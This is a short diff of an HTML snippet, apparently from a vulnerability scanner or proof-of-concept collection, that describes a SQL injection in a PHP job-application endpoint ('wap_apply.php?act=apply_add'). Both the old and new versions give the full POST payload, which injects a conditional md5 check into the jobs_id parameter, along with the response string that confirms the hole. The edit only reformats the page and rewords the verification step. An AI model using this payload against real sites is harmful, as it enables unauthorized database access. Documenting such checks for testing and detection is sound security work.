@@ -1,11 +1,9 @@
 <meta charset="UTF-8">
 <div>
-    <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/upload/wap/personal/wap_apply.php?act=apply_add</p>
-    </ul>
-    <h3>POST-payload: </h3>
-        <code>resume_id=1&jobs_id=23 and if(ascii(substr(md5(c),1,1))=113,1,null)%23</code>
-    <h3>验证过程</h3>
-    <p>查看response text 是否含有"c"的md5值 "4a8a08f09d37b73795649038408b5f33"</p>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/upload/wap/personal/wap_apply.php?act=apply_add</code>
+    <h3>POST-DATA: </h3>
+    <code>resume_id=1&jobs_id=23 and if(ascii(substr(md5(c),1,1))=113,1,null)%23</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
 </div>
